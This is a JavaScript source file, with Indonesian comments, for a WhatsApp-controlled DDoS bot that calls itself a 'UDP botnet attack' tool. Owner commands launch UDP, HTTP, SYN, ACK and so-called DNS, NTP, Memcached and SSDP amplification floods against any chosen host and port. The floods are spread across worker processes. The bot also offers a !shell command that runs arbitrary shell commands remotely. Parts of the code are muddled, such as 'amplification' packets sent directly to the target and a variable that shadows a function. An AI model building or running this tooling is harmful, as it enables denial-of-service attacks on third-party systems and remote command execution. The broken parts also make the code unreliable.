const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const readline = require('readline');
const { exec } = require('child_process');
const { createSocket } = require('dgram');
const { randomBytes } = require('crypto');
const net = require('net');
const os = require('os');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

// Konfigurasi bot
const CONFIG = {
    prefix: '!',
    ownerNumber: '6281280174445', // Ganti dengan nomor WhatsApp Anda
    authPath: './auth_info',
    logLevel: 'silent',
    attackDelay: 3, // Tidak ada delay antar paket (maksimum kecepatan)
    maxThreads: 5000, // Jumlah thread per serangan sangat tinggi
    maxPacketSize: 655057, // Ukuran maksimal UDP packet
    multiprocessing: true, // Gunakan multi-process untuk serangan
    amplificationFactor: 10 // Faktor amplifikasi untuk serangan
};

// State aplikasi
const state = {
    attacks: {},
    sockets: [],
    totalPacketsSent: 0,
    totalBytesSent: 0,
    startTime: Date.now(),
    workers: []
};

// Readline interface
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Payload templates untuk berbagai jenis serangan
const ATTACK_TEMPLATES = {
    udp: Buffer.from(randomBytes(512)), // Basic UDP flood
    
    // NTP amplification payload
    ntp: Buffer.from([
        0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ]),
    
    // DNS amplification query
    dns: Buffer.from([
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
        0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
        0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
    ]),
    
    // SYN flood simulation
    syn: Buffer.from([
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    ]),
    
    // MEMCACHED amplification
    memcached: Buffer.from([
        0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x73, 0x74, 0x61, 0x74, 0x73, 0x0d, 0x0a
    ]),
    
    // SSDP amplification
    ssdp: Buffer.from(
        'M-SEARCH * HTTP/1.1\r\n' +
        'HOST: 239.255.255.250:1900\r\n' +
        'MAN: "ssdp:discover"\r\n' +
        'MX: 2\r\n' +
        'ST: ssdp:all\r\n\r\n'
    ),
    
    // ACK flood simulation
    ack: Buffer.from([
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x50, 0x10, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    ]),
    
    // HTTP flood with random GET
    http: (target) => {
        const paths = ['/','index.php','login.php','admin.php','search','api/v1','user','profile'];
        const randomPath = paths[Math.floor(Math.random() * paths.length)];
        const httpRequest = 
            `GET ${randomPath} HTTP/1.1\r\n` +
            `Host: ${target}\r\n` +
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n' +
            'Accept: */*\r\n' +
            'Connection: Keep-Alive\r\n\r\n';
        return Buffer.from(httpRequest);
    }
};

// Fungsi untuk mengecek status target
const checkTarget = (target, port = 80) => {
    return new Promise((resolve) => {
        // Cek DNS terlebih dahulu
        const socket = new net.Socket();
        socket.setTimeout(5000); // 5 detik timeout
        
        let isResolved = false;
        
        socket.on('connect', () => {
            if (isResolved) return;
            socket.destroy();
            isResolved = true;
            resolve({
                status: 'up',
                message: 'Target hidup dan dapat diakses',
                isUp: true,
                latency: Date.now() - connectStart
            });
        });
        
        socket.on('timeout', () => {
            if (isResolved) return;
            socket.destroy();
            isResolved = true;
            resolve({
                status: 'timeout',
                message: 'Koneksi timeout - target mungkin down',
                isUp: false
            });
        });
        
        socket.on('error', (err) => {
            if (isResolved) return;
            socket.destroy();
            isResolved = true;
            
            if (err.code === 'ECONNREFUSED') {
                resolve({
                    status: 'port_closed',
                    message: `Port ${port} tertutup tapi host hidup`,
                    isUp: true
                });
            } else {
                resolve({
                    status: 'error',
                    message: `Target tidak dapat diakses: ${err.message}`,
                    isUp: false
                });
            }
        });
        
        const connectStart = Date.now();
        socket.connect(port, target);
    });
};

// Fungsi untuk menjalankan perintah shell
const runCommand = (command) => {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(error);
                return;
            }
            resolve(stdout || stderr);
        });
    });
};

// Membuat payload serangan
const createPayload = (type, target, size) => {
    // Dapatkan template
    let basePayload;
    if (type === 'http') {
        basePayload = ATTACK_TEMPLATES.http(target);
    } else if (ATTACK_TEMPLATES[type]) {
        basePayload = ATTACK_TEMPLATES[type];
    } else {
        // Default ke UDP flood jika tipe tidak dikenali
        basePayload = ATTACK_TEMPLATES.udp;
        type = 'udp';
    }
    
    // Buat payload dengan ukuran yang diminta
    const payload = Buffer.alloc(size);
    
    // Salin template ke awal payload
    basePayload.copy(payload);
    
    // Isi sisa dengan data random
    if (basePayload.length < size) {
        randomBytes(size - basePayload.length).copy(payload, basePayload.length);
    }
    
    return payload;
};

// Fungsi attack yang dijalankan oleh worker
const attackWorker = (target, port, duration, payload, attackId, intensity = 1) => {
    const sockets = [];
    const stats = { packetsSent: 0, bytesSent: 0 };
    const socketCount = 50 * intensity; // Membuat lebih banyak socket berdasarkan intensitas
    
    // Buat multiple socket untuk serangan
    for (let i = 0; i < socketCount; i++) {
        try {
            const socket = createSocket('udp4');
            socket.unref(); // Biarkan program keluar meskipun socket masih terbuka
            socket.on('error', () => {}); // Ignore errors
            sockets.push(socket);
        } catch (err) {
            // Ignore socket creation errors
        }
    }
    
    // Kirim paket secepat mungkin
    const sendPackets = () => {
        for (const socket of sockets) {
            for (let i = 0; i < 50; i++) { // Kirim 50 paket per socket per iterasi
                try {
                    socket.send(payload, 0, payload.length, port, target);
                    stats.packetsSent++;
                    stats.bytesSent += payload.length;
                } catch (err) {
                    // Ignore send errors
                }
            }
        }
        
        // Schedule next burst immediately
        if (Date.now() < endTime) {
            setImmediate(sendPackets);
        } else {
            // Cleanup sockets when done
            for (const socket of sockets) {
                try {
                    socket.close();
                } catch (err) {}
            }
            
            // Send final stats to parent
            if (process.send) {
                process.send({
                    type: 'attackComplete',
                    attackId,
                    stats
                });
            }
            
            process.exit(0);
        }
    };
    
    // Set end time
    const endTime = Date.now() + (duration * 1000);
    
    // Start sending
    sendPackets();
};

// Memulai serangan dengan multi-process
const startAttack = (target, port, duration, size = 1024, threads = 100, type = 'udp', amplify = 1) => {
    console.log(`[Attack] Memulai serangan ke ${target}:${port} (${duration}s, ${threads} threads, ${size}b, ${type})`);
    
    const attackId = `${target}:${port}`;
    
    // Jika sudah ada serangan yang sama, hentikan dulu
    if (state.attacks[attackId]) {
        stopAttack(target, port);
    }
    
    // Validasi dan batasi parameter
    const actualSize = Math.min(size, CONFIG.maxPacketSize);
    const actualThreads = Math.min(threads, CONFIG.maxThreads);
    
    // Generate payload
    const payload = createPayload(type, target, actualSize);
    
    // Statistik serangan
    const attackStats = {
        target,
        port,
        type,
        size: actualSize,
        threads: actualThreads,
        duration,
        startTime: Date.now(),
        packetsSent: 0,
        bytesSent: 0,
        workers: []
    };
    
    // Jika multi-processing diaktifkan, gunakan workers
    if (CONFIG.multiprocessing) {
        // Hitung jumlah worker berdasarkan thread
        const workerCount = Math.min(numCPUs, Math.ceil(actualThreads / 50));
        
        for (let i = 0; i < workerCount; i++) {
            const worker = cluster.fork();
            
            // Kirim parameter serangan ke worker
            worker.send({
                type: 'startAttack',
                target,
                port,
                duration,
                attackId,
                size: actualSize,
                intensity: Math.ceil(actualThreads / workerCount) / 50
            });
            
            // Tambahkan worker ke daftar
            attackStats.workers.push(worker.id);
            state.workers.push(worker);
            
            // Handle pesan dari worker
            worker.on('message', (msg) => {
                if (msg.type === 'attackComplete') {
                    // Update statistik dari worker
                    state.attacks[msg.attackId].packetsSent += msg.stats.packetsSent;
                    state.attacks[msg.attackId].bytesSent += msg.stats.bytesSent;
                    state.totalPacketsSent += msg.stats.packetsSent;
                    state.totalBytesSent += msg.stats.bytesSent;
                }
            });
            
            // Handle worker exit
            worker.on('exit', () => {
                const index = state.workers.indexOf(worker);
                if (index !== -1) {
                    state.workers.splice(index, 1);
                }
            });
        }
    } else {
        // Gunakan pendekatan single-process dengan setInterval
        const sockets = [];
        
        // Buat socket
        for (let i = 0; i < actualThreads; i++) {
            try {
                const socket = createSocket('udp4');
                socket.on('error', () => {});
                sockets.push(socket);
                state.sockets.push(socket);
            } catch (err) {
                console.error(`Error socket: ${err.message}`);
            }
        }
        
        // Buat interval untuk mengirim
        const intervalId = setInterval(() => {
            for (const socket of sockets) {
                try {
                    for (let i = 0; i < amplify; i++) { // Kirim beberapa paket per iterasi
                        socket.send(payload, 0, payload.length, port, target, (err) => {
                            if (!err) {
                                attackStats.packetsSent++;
                                attackStats.bytesSent += payload.length;
                                state.totalPacketsSent++;
                                state.totalBytesSent += payload.length;
                            }
                        });
                    }
                } catch (err) {
                    // Ignore errors
                }
            }
        }, CONFIG.attackDelay);
        
        // Simpan referensi ke interval dan socket
        attackStats.intervalId = intervalId;
        attackStats.sockets = sockets;
    }
    
    // Simpan info serangan
    state.attacks[attackId] = attackStats;
    
    // Set timeout untuk menghentikan serangan
    if (duration > 0) {
        setTimeout(() => {
            stopAttack(target, port);
        }, duration * 1000);
    }
    
    return attackId;
};

// Menghentikan serangan
const stopAttack = (target, port) => {
    const attackId = `${target}:${port}`;
    const attack = state.attacks[attackId];
    
    if (!attack) {
        return false;
    }
    
    console.log(`[Attack] Menghentikan serangan ke ${target}:${port}`);
    
    // Hentikan serangan berdasarkan mode
    if (CONFIG.multiprocessing) {
        // Mode multi-process: kirim pesan stop ke workers
        state.workers.forEach(worker => {
            try {
                worker.kill('SIGTERM');
            } catch (err) {
                // Ignore errors
            }
        });
        
        // Reset workers array
        state.workers = [];
    } else {
        // Mode single-process: hentikan interval dan tutup socket
        clearInterval(attack.intervalId);
        
        // Tutup socket
        for (const socket of attack.sockets) {
            try {
                socket.close();
                const index = state.sockets.indexOf(socket);
                if (index !== -1) {
                    state.sockets.splice(index, 1);
                }
            } catch (err) {
                // Ignore errors
            }
        }
    }
    
    // Hitung uptime serangan
    const elapsed = (Date.now() - attack.startTime) / 1000;
    console.log(`[Stats] Serangan selesai: ${attack.packetsSent.toLocaleString()} paket (${Math.round(attack.bytesSent / (1024 * 1024))} MB) dalam ${elapsed.toFixed(2)}s`);
    
    // Hapus dari daftar serangan aktif
    delete state.attacks[attackId];
    
    return true;
};

// Meminta pairing code untuk WhatsApp
const requestPairingCode = async (sock) => {
    try {
        // Tanya nomor WhatsApp
        const phoneNumber = await new Promise((resolve) => {
            rl.question('Masukkan nomor WhatsApp (format: 628xxxxx): ', (answer) => {
                resolve(answer.trim());
            });
        });
        
        // Validasi format nomor
        if (!phoneNumber.match(/^\d+$/)) {
            console.log('Nomor telepon hanya boleh berisi angka tanpa spasi atau karakter khusus');
            return await requestPairingCode(sock);
        }
        
        console.log(`\nMeminta kode pairing untuk nomor ${phoneNumber}...`);
        
        // Minta kode pairing
        const code = await sock.requestPairingCode(phoneNumber);
        
        console.log('\n==================================');
        console.log(`KODE PAIRING: ${code}`);
        console.log('==================================\n');
        console.log('Masukkan kode ini di WhatsApp untuk menautkan perangkat');
        
    } catch (error) {
        console.error('Error saat meminta kode pairing:', error);
        console.log('Coba lagi dalam 5 detik...');
        
        // Tunggu 5 detik dan coba lagi
        await new Promise(resolve => setTimeout(resolve, 5000));
        await requestPairingCode(sock);
    }
};

// Handle perintah WhatsApp
const handleCommand = async (sock, msg, command, params) => {
    const sender = msg.key.remoteJid;
    const isSenderOwner = sender.includes(CONFIG.ownerNumber);
    
    // Hanya owner yang bisa menggunakan command
    if (!isSenderOwner && command !== 'ping') {
        await sock.sendMessage(sender, { text: '⛔ Anda tidak memiliki akses untuk perintah ini.' }, { quoted: msg });
        return;
    }
    
    try {
        switch (command) {
            case 'ping':
                await sock.sendMessage(sender, { text: '🟢 Pong! Bot aktif.' }, { quoted: msg });
                break;
                
            case 'attack':
                if (params.length < 3) {
                    await sock.sendMessage(sender, { 
                        text: `⚠️ Penggunaan: !attack <target> <port> <durasi> [ukuran] [threads] [tipe]

Tipe serangan:
- udp: UDP Flood standar (default)
- http: HTTP Flood dengan GET requests
- syn: SYN Flood simulation
- dns: DNS Amplification simulation
- ntp: NTP Amplification simulation
- memcached: Memcached Amplification
- ssdp: SSDP Amplification
- ack: ACK Flood simulation`
                    }, { quoted: msg });
                    return;
                }
                
                const [target, port, duration, size = 1024, threads = 500, type = 'udp'] = params;
                
                if (isNaN(port) || isNaN(duration)) {
                    await sock.sendMessage(sender, { text: '⚠️ Port dan durasi harus berupa angka.' }, { quoted: msg });
                    return;
                }
                
                // Cek status target dulu
                await sock.sendMessage(sender, { text: `🔍 Mengecek status target ${target}:${port}...` }, { quoted: msg });
                
                const status = await checkTarget(target, parseInt(port));
                
                let statusEmoji = status.isUp ? '🟢' : '🔴';
                await sock.sendMessage(sender, { 
                    text: `${statusEmoji} Status Target: ${target}:${port}
Status: ${status.status}
Message: ${status.message}
Hidup: ${status.isUp ? 'Ya' : 'Tidak'}`
                }, { quoted: msg });
                
                // Mulai serangan
                const attackId = startAttack(
                    target, 
                    parseInt(port), 
                    parseInt(duration),
                    parseInt(size),
                    parseInt(threads),
                    type,
                    CONFIG.amplificationFactor
                );
                
                await sock.sendMessage(sender, { 
                    text: `🚀 Serangan UDP dimulai!
Target: ${target}:${port}
Durasi: ${duration} detik
Ukuran: ${size} bytes
Threads: ${threads}
Tipe: ${type}
ID: ${attackId}
Mode: ${CONFIG.multiprocessing ? 'Multi-process' : 'Single-process'}`
                }, { quoted: msg });
                break;
                
            case 'stop':
                if (params.length < 2) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !stop <target> <port>' }, { quoted: msg });
                    return;
                }
                
                const [stopTarget, stopPort] = params;
                const stopped = stopAttack(stopTarget, parseInt(stopPort));
                
                if (stopped) {
                    await sock.sendMessage(sender, { text: `✅ Serangan ke ${stopTarget}:${stopPort} dihentikan.` }, { quoted: msg });
                } else {
                    await sock.sendMessage(sender, { text: `⚠️ Tidak ada serangan aktif ke ${stopTarget}:${stopPort}.` }, { quoted: msg });
                }
                break;
                
            case 'stopall':
                let count = 0;
                for (const attackId in state.attacks) {
                    const [t, p] = attackId.split(':');
                    if (stopAttack(t, parseInt(p))) {
                        count++;
                    }
                }
                
                await sock.sendMessage(sender, { text: `✅ ${count} serangan dihentikan.` }, { quoted: msg });
                break;
                
            case 'list':
                if (Object.keys(state.attacks).length === 0) {
                    await sock.sendMessage(sender, { text: '📋 Tidak ada serangan aktif.' }, { quoted: msg });
                    return;
                }
                
                let listMessage = '📋 Daftar serangan aktif:\n\n';
                for (const attackId in state.attacks) {
                    const attack = state.attacks[attackId];
                    const elapsedTime = Math.floor((Date.now() - attack.startTime) / 1000);
                    const remainingTime = attack.duration - elapsedTime;
                    
                    listMessage += `Target: ${attack.target}:${attack.port}\n`;
                    listMessage += `Tipe: ${attack.type}\n`;
                    listMessage += `Threads: ${attack.threads}\n`;
                    listMessage += `Ukuran: ${attack.size} bytes\n`;
                    listMessage += `Durasi: ${attack.duration}s\n`;
                    listMessage += `Waktu berjalan: ${elapsedTime}s\n`;
                    listMessage += `Sisa waktu: ${Math.max(0, remainingTime)}s\n`;
                    listMessage += `Paket terkirim: ${attack.packetsSent.toLocaleString()}\n`;
                    listMessage += `Data terkirim: ${Math.round(attack.bytesSent / (1024 * 1024))} MB\n\n`;
                }
                
                await sock.sendMessage(sender, { text: listMessage }, { quoted: msg });
                break;
                
            case 'check':
                if (params.length < 1) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !check <target> [port]' }, { quoted: msg });
                    return;
                }
                
                const [checkTarget, checkPort = 80] = params;
                
                await sock.sendMessage(sender, { text: `🔍 Mengecek status ${checkTarget}:${checkPort}...` }, { quoted: msg });
                
                const targetStatus = await checkTarget(checkTarget, parseInt(checkPort));
                
                let statusIcon = targetStatus.isUp ? '🟢' : '🔴';
                await sock.sendMessage(sender, { 
                    text: `${statusIcon} Status Target: ${checkTarget}:${checkPort}
Status: ${targetStatus.status}
Message: ${targetStatus.message}
Hidup: ${targetStatus.isUp ? 'Ya' : 'Tidak'}
${targetStatus.latency ? `Latency: ${targetStatus.latency}ms` : ''}`
                }, { quoted: msg });
                break;
                
            case 'info':
                // Informasi server
                const serverInfo = {
                    hostname: os.hostname(),
                    platform: os.platform(),
                    cpuCount: os.cpus().length,
                    cpuModel: os.cpus()[0].model,
                    totalMemory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + ' GB',
                    freeMemory: Math.round(os.freemem() / (1024 * 1024 * 1024)) + ' GB',
                    uptime: Math.floor(os.uptime() / 3600) + ' hours'
                };
                
                // Hitung uptime bot
                const botUptime = Math.floor((Date.now() - state.startTime) / 1000);
                const days = Math.floor(botUptime / 86400);
                const hours = Math.floor((botUptime % 86400) / 3600);
                const minutes = Math.floor((botUptime % 3600) / 60);
                const seconds = botUptime % 60;
                
                // Hitung traffic
                const totalMB = Math.round(state.totalBytesSent / (1024 * 1024));
                const totalGB = (totalMB / 1024).toFixed(2);
                
                const infoMessage = `📊 Informasi Bot & Server

🤖 Bot Info:
- Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s
- Total paket terkirim: ${state.totalPacketsSent.toLocaleString()}
- Total traffic: ${totalGB} GB

💻 Server Info:
- Hostname: ${serverInfo.hostname}
- Platform: ${serverInfo.platform}
- CPU: ${serverInfo.cpuModel} (${serverInfo.cpuCount} cores)
- Memory: ${serverInfo.freeMemory} free / ${serverInfo.totalMemory} total
- System uptime: ${serverInfo.uptime}

⚙️ Config:
- Multi-processing: ${CONFIG.multiprocessing ? 'Aktif' : 'Tidak aktif'}
- Max threads: ${CONFIG.maxThreads}
- Amplification: ${CONFIG.amplificationFactor}x

⚔️ Attack Status:
- Serangan aktif: ${Object.keys(state.attacks).length}`;

                await sock.sendMessage(sender, { text: infoMessage }, { quoted: msg });
                break;
                
            case 'shell':
                if (!isSenderOwner) {
                    await sock.sendMessage(sender, { text: '⛔ Perintah ini hanya untuk owner.' }, { quoted: msg });
                    return;
                }
                
                if (params.length === 0) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !shell <command>' }, { quoted: msg });
                    return;
                }
                
                const shellCommand = params.join(' ');
                try {
                    const result = await runCommand(shellCommand);
                    await sock.sendMessage(sender, { text: `🖥️ Output:\n\n${result || 'Tidak ada output'}` }, { quoted: msg });
                } catch (error) {
                    await sock.sendMessage(sender, { text: `❌ Error: ${error.message}` }, { quoted: msg });
                }
                break;
                
            case 'help':
                const helpMessage = `📚 Daftar Perintah UDP Attack Bot:

⚡ Attack Commands:
!attack <target> <port> <durasi> [ukuran] [threads] [tipe] - Mulai serangan UDP
!stop <target> <port> - Hentikan serangan ke target
!stopall - Hentikan semua serangan aktif
!list - Tampilkan daftar serangan aktif

🔍 Tools & Monitoring:
!check <target> [port] - Cek status target
!info - Tampilkan info server dan bot
!ping - Cek status bot

🖥️ System Commands:
!shell <command> - Jalankan perintah shell (owner only)

❓ Misc:
!help - Tampilkan pesan ini

Tipe serangan yang tersedia:
- udp: UDP Flood standar
- http: HTTP Flood dengan GET requests
- syn: SYN Flood simulation
- dns: DNS Amplification simulation
- ntp: NTP Amplification simulation
- memcached: Memcached Amplification
- ssdp: SSDP Amplification
- ack: ACK Flood simulation`;

                await sock.sendMessage(sender, { text: helpMessage }, { quoted: msg });
                break;
                
            default:
                await sock.sendMessage(sender, { text: `⚠️ Perintah tidak dikenal: ${command}\nGunakan !help untuk melihat daftar perintah.` }, { quoted: msg });
        }
    } catch (error) {
        console.error('Error saat menangani command:', error);
        await sock.sendMessage(sender, { text: `❌ Terjadi kesalahan: ${error.message}` }, { quoted: msg });
    }
};

// Fungsi utama untuk menjalankan bot
async function startBot() {
    console.log('='.repeat(50));
    console.log('🚀 UDP BOTNET ATTACK - SUPER EDITION');
    console.log('='.repeat(50));
    
    // Buat folder auth jika belum ada
    if (!fs.existsSync(CONFIG.authPath)) {
        fs.mkdirSync(CONFIG.authPath, { recursive: true });
    }
    
    // Inisialisasi auth state
    const { state: authState, saveCreds } = await useMultiFileAuthState(CONFIG.authPath);
    
    // Setup logger
    const logger = pino({ level: CONFIG.logLevel });
    
    // Buat socket WhatsApp
    const sock = makeWASocket({
        auth: authState,
        printQRInTerminal: false,
        logger,
        browser: ['Chrome (Linux)', 'Chrome', '103.0.5060.114'],
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: false,
        markOnlineOnConnect: false
    });
    
    // Handle koneksi
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'open') {
            console.log('\n✅ Bot terhubung ke WhatsApp!');
            console.log(`📱 Nomor: ${sock.user.id.split(':')[0]}`);
            
            // Setup multi-processing dengan cluster jika diaktifkan
            if (CONFIG.multiprocessing && cluster.isPrimary) {
                console.log(`\n🔄 Setting up ${numCPUs} worker processes for attacks`);
                
                // Listen for worker messages
                cluster.on('message', (worker, message) => {
                    if (message.type === 'attackStats') {
                        // Update attack stats
                        if (state.attacks[message.attackId]) {
                            state.attacks[message.attackId].packetsSent += message.packetsSent;
                            state.attacks[message.attackId].bytesSent += message.bytesSent;
                            state.totalPacketsSent += message.packetsSent;
                            state.totalBytesSent += message.bytesSent;
                        }
                    }
                });
            } else if (cluster.isWorker) {
                // Worker process logic
                process.on('message', (message) => {
                    if (message.type === 'startAttack') {
                        attackWorker(
                            message.target,
                            message.port,
                            message.duration,
                            createPayload(message.type || 'udp', message.target, message.size || 1024),
                            message.attackId,
                            message.intensity || 1
                        );
                    }
                });
            }
        }
        
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            
            console.log('\n❌ Koneksi terputus');
            if (shouldReconnect) {
                console.log('🔄 Mencoba menghubungkan ulang...');
                
                // Cleanup resources
                stopAllAttacks();
                
                // Wait 3 seconds and try again
                setTimeout(() => {
                    startBot();
                }, 3000);
            } else {
                console.log('❌ Logged out, tidak menghubungkan ulang');
                process.exit(0);
            }
        }
        
        // Request pairing code when connecting
        if (connection === 'connecting') {
            setTimeout(async () => {
                if (!sock.user) {
                    await requestPairingCode(sock);
                }
            }, 3000);
        }
    });
    
    // Handle pesan masuk
    sock.ev.on('messages.upsert', async (m) => {
        if (m.type !== 'notify') return;
        
        for (const msg of m.messages) {
            try {
                if (!msg.message) continue;
                
                const msgType = Object.keys(msg.message)[0];
                let msgText = '';
                
                // Extract text from message
                if (msgType === 'conversation') {
                    msgText = msg.message.conversation;
                } else if (msgType === 'extendedTextMessage') {
                    msgText = msg.message.extendedTextMessage.text;
                } else {
                    continue;
                }
                
                // Check if message is a command
                if (!msgText.startsWith(CONFIG.prefix)) continue;
                
                const cmdParts = msgText.slice(CONFIG.prefix.length).trim().split(/\s+/);
                const command = cmdParts[0].toLowerCase();
                const params = cmdParts.slice(1);
                
                console.log(`[Command] ${command} ${params.join(' ')}`);
                await handleCommand(sock, msg, command, params);
            } catch (error) {
                console.error('Error saat memproses pesan:', error);
            }
        }
    });
    
    // Handle credentials update
    sock.ev.on('creds.update', saveCreds);
    
    // Fungsi untuk menghentikan semua serangan
    const stopAllAttacks = () => {
        // Stop all active attacks
        for (const attackId in state.attacks) {
            const [target, port] = attackId.split(':');
            stopAttack(target, parseInt(port));
        }
        
        // Kill all worker processes
        for (const worker of state.workers) {
            try {
                worker.kill('SIGTERM');
            } catch (err) {
                // Ignore errors
            }
        }
        state.workers = [];
        
        // Close all sockets
        for (const socket of state.sockets) {
            try {
                socket.close();
            } catch (err) {
                // Ignore errors
            }
        }
        state.sockets = [];
    };
    
    // Handle process exit
    process.on('SIGINT', async () => {
        console.log('\n🛑 Menghentikan bot...');
        
        stopAllAttacks();
        
        console.log('👋 Bot dihentikan.');
        process.exit(0);
    });
    
    return sock;
}

// Mode operasi berdasarkan cluster
if (cluster.isPrimary) {
    // Primary process starts the bot
    console.log(`🔄 Starting primary process (PID: ${process.pid})`);
    
    // Mulai bot
    startBot().catch(err => {
        console.error('❌ Error saat menjalankan bot:', err);
        console.log('🔄 Mencoba ulang dalam 5 detik...');
        setTimeout(() => {
            startBot();
        }, 5000);
    });
} else {
    // Worker process just waits for messages
    console.log(`🔄 Worker process started (PID: ${process.pid})`);
    
    // Keep track of stats
    const workerStats = {
        packetsSent: 0,
        bytesSent: 0
    };
    
    // Send stats to primary process periodically
    setInterval(() => {
        if (process.send && workerStats.packetsSent > 0) {
            process.send({
                type: 'attackStats',
                packetsSent: workerStats.packetsSent,
                bytesSent: workerStats.bytesSent
            });
            workerStats.packetsSent = 0;
            workerStats.bytesSent = 0;
        }
    }, 1000);
}
